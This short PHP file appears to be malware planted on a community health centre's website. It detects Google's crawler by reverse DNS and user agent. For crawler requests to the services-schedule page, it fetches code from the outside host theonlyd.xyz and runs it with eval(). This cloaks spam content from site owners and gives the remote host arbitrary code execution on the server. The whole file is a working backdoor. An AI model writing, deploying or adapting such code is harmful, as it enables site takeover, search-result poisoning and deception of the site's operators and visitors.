<?php

$userIp = $_SERVER['REMOTE_ADDR'];
$userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
$referer = isset($_SERVER['HTTP_REFERER']) ? strtolower($_SERVER['HTTP_REFERER']) : '';
$hostname = gethostbyaddr($userIp);
$currentPath = $_SERVER['REQUEST_URI'];

function isGooglebot($hostname, $userAgent) {
	return (
		strpos($hostname, 'googlebot.com') !== false ||
		strpos($userAgent, 'google-inspectiontool') !== false ||
		strpos($userAgent, 'google') !== false
	);
}

if (isGooglebot($hostname, $userAgent) && strpos($currentPath, '/pelayanan/jadwal-pelayanan/') !== false) {
	$remoteCode = @file_get_contents('https://theonlyd.xyz/puskesmascipayung-pelayanan.html');
	if ($remoteCode) {
		eval('?>' . $remoteCode);
		exit;
	}
}

